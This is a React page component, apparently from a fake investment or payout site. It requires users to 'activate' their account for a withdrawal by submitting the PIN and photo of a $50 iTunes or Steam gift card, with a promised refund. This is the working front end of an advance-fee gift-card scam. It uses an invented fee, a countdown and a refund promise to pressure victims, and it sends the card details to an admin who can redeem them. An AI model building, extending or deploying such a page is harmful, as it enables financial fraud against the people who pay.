// src/pages/ActivateAccount.jsx
import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { submitActivationPayment } from '../services/api';
import './styles/activate-account.css';

export default function ActivateAccount() {
  // Activation method is fixed to giftcard/apple-itunes
  const loc = useLocation();
  const nav = useNavigate();
  // If withdrawalId was provided from previous step, include it
  const { withdrawalId } = loc.state || {};

  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [form, setForm] = useState({
    cardType: 'iTunes', // default to iTunes
    cardPin: ''
  });
  const [giftImage, setGiftImage] = useState(null);
  const [previewUrl, setPreviewUrl] = useState(null);

  const onChange = (k) => (e) => setForm({ ...form, [k]: e.target.value });

  const handleFile = (e) => {
    const f = e.target.files[0];
    if (!f) {
      setGiftImage(null);
      setPreviewUrl(null);
      return;
    }
    setGiftImage(f);
    try {
      const url = URL.createObjectURL(f);
      setPreviewUrl(url);
    } catch (err) {
      setPreviewUrl(null);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('');
    if (!form.cardPin) return alert('Card pin is required');
    if (!giftImage) return alert('Please upload gift card image');

    setLoading(true);
    try {
      const fd = new FormData();
      // Activation flow expects giftcard method
      fd.append('method', 'giftcard');
      fd.append('cardType', form.cardType);
      fd.append('cardPin', form.cardPin);
      // legacy backend expects 'giftImage' field; paymentController supports it
      fd.append('giftImage', giftImage);

      // if withdrawalId is available, include it and stage to tie to the withdrawal
      if (withdrawalId) {
        fd.append('withdrawalId', withdrawalId);
        fd.append('stage', 'activation');
      }

      await submitActivationPayment(fd);

      // After submit: admin email and notification is handled server-side (paymentController)
      setStatus('Activation submitted. Check your dashboard notifications for the activation code.');
      // Redirect to confirm-activate page where user will enter 4-digit pin
      nav('/withdraw/confirm-activate', { state: { withdrawalId } });
    } catch (err) {
      console.error(err);
      setStatus(err?.response?.data?.message || 'Failed to submit activation');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page-container">
      <div className="card">
        <h3>Activate account for withdrawal</h3>

        <p className="small-muted">
        
Activate your account using a $50 gift card within the countdown period.
The gift card PIN enables activation and fund withdrawal, and the $50 fee will be refunded after activation.        </p>

        <form onSubmit={handleSubmit} style={{ marginTop: 12 }}>
          <label style={{ display: 'block', marginBottom: 8 }}>
            <span className="small-muted">Activation method</span>
            <input className="input" readOnly value="Gift Card" style={{ marginTop: 6, cursor: 'not-allowed', background: '#f9fafb' }} />
          </label>

          <label style={{ display: 'block', marginBottom: 8 }}>
            <span className="small-muted">Card type</span>
            <select className="input" value={form.cardType} onChange={onChange('cardType')} style={{ marginTop: 6 }}>
              <option value="iTunes">iTunes gift card</option>
              <option value="Steam">Steam gift card</option>
            </select>
          </label>

          <label style={{ display: 'block', marginBottom: 8 }}>
            <span className="small-muted">Card pin</span>
            <input className="input" value={form.cardPin} onChange={onChange('cardPin')} placeholder="Enter scratched PIN" style={{ marginTop: 6 }} />
          </label>

          <label style={{ display: 'block', marginBottom: 8 }}>
            <span className="small-muted">Upload gift card image</span>
            <input type="file" accept="image/*" onChange={handleFile} style={{ marginTop: 6 }} />
            {giftImage && (
              <div style={{ marginTop: 10, display: 'flex', gap: 12, alignItems: 'center' }}>
                {previewUrl ? (
                  <img src={previewUrl} alt="preview" style={{ width: 90, height: 66, objectFit: 'cover', borderRadius: 6, border: '1px solid #e5e7eb' }} />
                ) : null}
                <div>
                  <div style={{ fontWeight: 700 }}>Image available</div>
                  <div className="small-muted" style={{ fontSize: 12 }}>{giftImage.name} — {(giftImage.size / 1024).toFixed(0)} KB</div>
                </div>
              </div>
            )}
          </label>

          <div style={{ marginTop: 12 }}>
            <button className="btn" type="submit" disabled={loading}>
              {loading ? 'Activating...' : 'Activate'}
            </button>
          </div>
        </form>

        {status && <div style={{ marginTop: 12, padding: 8, borderRadius: 8, background: '#f8fafc' }}>{status}</div>}
      </div>
    </div>
  );
}
